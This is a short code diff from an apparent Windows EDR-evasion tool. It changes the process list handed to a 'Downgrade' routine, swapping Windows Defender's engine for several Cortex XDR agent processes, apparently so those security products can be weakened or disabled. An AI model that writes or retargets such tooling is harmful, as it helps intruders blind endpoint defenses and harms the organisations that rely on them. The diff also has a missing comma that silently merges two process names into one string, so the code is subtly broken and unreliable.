@@ -111,7 +111,13 @@ VOID Downgrade(DWORD pid) {
 int wmain(int argc, wchar_t* argv[]) {
 
 	LPCWSTR procNames[] = {
-		L"MsMpEng.exe",
+		L"cyserver.exe",
+		L"cyuserserver.exe",
+		L"cywscsvc.exe"
+		L"cysandbox.exe",
+		L"xdrhealth.exe",
+		L"cortex-xdr-payload.exe",
+		L"tlaworker.exe",
 	};
 
 	DWORD procCount = sizeof(procNames) / sizeof(procNames[0]);
